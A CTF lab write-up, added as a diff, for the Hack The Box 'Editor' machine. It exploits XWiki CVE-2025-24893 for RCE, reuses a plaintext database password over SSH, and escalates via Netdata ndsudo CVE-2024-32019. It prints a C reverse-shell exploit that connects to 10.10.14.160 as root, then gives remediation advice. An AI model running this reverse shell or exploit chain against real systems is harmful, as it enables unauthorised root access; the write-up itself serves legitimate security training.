@@ -1,0 +1,154 @@
+---
+title: "HtB Machine: Editor"
+description: Write-up for the HtB Editor machine.
+sidebar:
+  label: Editor
+---
+
+import { Aside } from '@astrojs/starlight/components';
+import { Image } from 'astro:assets'
+import nmapEditor from '@assets/security/editor/1-nmap.png'
+
+## Enumeration
+
+Starting with an nmap scan, let’s see what ports are open and what is running on our target.
+
+<Image src={nmapEditor} priority alt="Nmap scan for Editor" />
+
+Nmap gives us a few useful pieces of information. 
+- Our target host seems to be serving a website called *http:/<i></i>/editor.htb*. 
+- They also appear to be using [XWiki](https://www.xwiki.org/xwiki/bin/view/Main/WebHome), an open source enterprise wiki platform.
+- Our target host also appears to be open for SSH communication, which could be useful in the future.
+
+Let’s add editor.htb to our **/etc/hosts** file, and then navigate to the main page for *http:/<i></i>/editor.htb*.
+
+![Editor main page](@assets/security/editor/2-editor-main.png)
+
+Clicking around through our target site doesn’t reveal all that much, and the documentation link doesn’t resolve.
+
+Going back to our nmap scan, we know that our scan also revealed several XWiki pages. Navigating to *http:/<i></i>/editor.htb/xwiki/bin/view/Main* is more interesting.
+
+![XWiki Main Page](@assets/security/editor/3-XWiki-main.png)
+
+On the XWiki pages for our target, we can see they include the XWiki version at the bottom of the page: XWiki for Debian 15.10.8. 
+
+## Vulnerability
+
+Our target is serving XWiki 15.10.8, if we browse onto [XWiki’s downloads page](https://www.xwiki.org/xwiki/bin/view/Download/), we can see that the latest version is 17.8.0 (as of the time of writing this report). Thus, it could be helpful to search for any vulnerabilities for this older version.
+
+Searching for our target’s version comes up with CVE-2025-24893. OffSec has a [blog post](https://www.offsec.com/blog/cve-2025-24893/) about this specific vulnerability, and states that it affects all XWiki versions prior to 15.10.11, which includes our target!
+Based on the explanation, it looks like we can achieve remote code execution due to unsanitized input via a GET request to a specific macro and its interaction with Groovy.
+
+Various POCs can be found for this specific vulnerability, for example:
+https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC
+
+Going through the POC's code, there’s a decent amount of flavor that makes the POC easy to use, but the core of it revolves around a reverse shell payload, which is inserted with the Groovy formatting.
+
+To catch the reverse shell, we prepare a listener with netcat. Then, we launch the POC exploit, and catch our reverse shell:
+
+![Exploit POC for CVE-2025-24893](@assets/security/editor/4-exploit-1.png)
+
+Our reverse shell:
+![Netcat listener](@assets/security/editor/5-nc-rs.png)
+
+## Enumeration Pt. 2
+
+We can now use our reverse shell to enumerate the files on our target. 
+First, we can upgrade our shell.
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Next, let’s browse around the folder structure.
+It looks like the files for our target XWiki site are located in **/usr/lib/xwiki**. While looking through the .xml files for potential information, it looks like there is a config file called **hibernate.cfg.xml**.
+
+![Hibernate config file](@assets/security/editor/6-hibernate.png)
+
+Grepping this file for ‘password’ reveals a credential.
+
+![Grepping for password](@assets/security/editor/7-grep-pw.png)
+
+Another interesting result is found from browsing the **/home** folder. Here, we notice one user listed, **/oliver**. Currently, we cannot access this folder, but this gives us a username to try.
+
+![Finding Oliver username](@assets/security/editor/8-oliver.png)
+
+Since we have both a username and password, we can try SSHing to our target with our new credentials.
+
+![SSHing with credentials](@assets/security/editor/9-ssh.png)
+
+As **oliver**, we can now read the flag for **user.txt** in our home folder.
+
+## Privilege Escalation
+
+In searching for ways to escalate privilege, one of the potential paths we can try is to look for a file that has the SUID bit set.
+
+From this search, we can notice that our target contains various tools from Netdata. We can search online for Netdata vulnerabilities, where we find one for the **ndsudo** plugin, with the vulnerability [CVE-2024-32019](https://nvd.nist.gov/vuln/detail/CVE-2024-32019).
+It looks like Netdata’s ndsudo tool allows us to run arbitrary programs with root permissions. This tool searches for commands via the **$PATH** variable, thus letting us control where it looks for commands.
+
+Searching for this specific vulnerability, we again find a POC demonstrating the vulnerability:
+https://github.com/AliElKhatteb/CVE-2024-32019-POC
+
+Let’s take a look at the code:
+
+```c
+#include <unistd.h>
+#include <stddef.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.160/9001 0>&1", NULL);
+    return 0;
+}
+```
+
+It looks like a reverse shell for root written in C, which we can compile and export to our target machine.
+
+Based on the vulnerability description from netdata’s [Github](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93), we have make sure to do a few things.
+1. We make sure our compiled exploit is called **nvme**, as this is described as one of the commands **ndsudo** recognizes.
+2. When we call **ndsudo**, we make sure to specify our **$PATH** parameter as where we transferred our **nvme** exploit.
+
+We’ll take our C exploit code and compile this locally:
+
+![Specifying $PATH](@assets/security/editor/10-compile.png)
+
+Then, let’s transfer it to our target in the /tmp folder:
+
+![Specifying $PATH](@assets/security/editor/11-scp.png)
+
+Let’s run our exploit, and catch the root reverse shell. We’ll make our exploit executable with chmod. We call ndsudo, and this is where we specify our $PATH parameter to our exploit.
+
+![Specifying $PATH](@assets/security/editor/12-path.png)
+
+In our other window we’ve set up the listener and we get our reverse shell:
+
+![Root access](@assets/security/editor/x-root.png)
+
+And we have root access! We can now complete our system flag capture.
+
+## Remediation
+
+<Aside type="note">
+It’s understood that Hack The Box machines are designed to be exploitable, and also that a capture-the-flag exercise is not indicative of the goals of real-life red team activities. Nonetheless, this section is included in this report for practice and learning.
+</Aside>
+
+### Summary:
+- Scope: 10.10.11.80 http:/<i></i>/editor.htb
+- CTF Date: 10/5/2025
+- Scope was a pure penetration CTF exercise, for both user and root privileges.
+- The test was run as a black-box from a VPN belonging to the target. All testing was run from 10.10.14.160.
+
+The HacktheBox Editor machine was attacked on October 5th, 2025. The test was primarily run between the hours of 9AM and 12PM, and the report compiled the following day. A VPN connection was provided, but no users or login information.
+
+The primary goal of the test was to determine if user accounts could be breached and eventually, root privileges could be accessed. A time limitation of one day was given, which was more than enough to be thorough. There were no other limitations or extenuating circumstances in this test.
+
+The application was well-organized, and we were unable to brute-force user accounts. However, we were able to find un-patched software which had vulnerabilities that allowed us to access both user and root accounts. Furthermore, we found an instance of credentials being stored in plain-text, which undermined the hardening efforts of the application.
+
+### Technical Details
+
+| Reference # | Risk | Issue Description | Recommendations |
+| --- | --- | --- | --- |
+| 1 | High | XWiki platform version contained a search macro that would process unsanitized data. This allows for injection into GET requests of the application. | XWiki users are recommended to immediately update to 15.10.11. |
+| 2 | High | Account passwords were found in a configuration file in plaintext. | All sensitive data should be stored with a strong hashing algorithm. |
+| 3 | High | Netdata plugins allowed for arbitrary root code execution. | Netdata plugins are recommended to be kept up to date. |
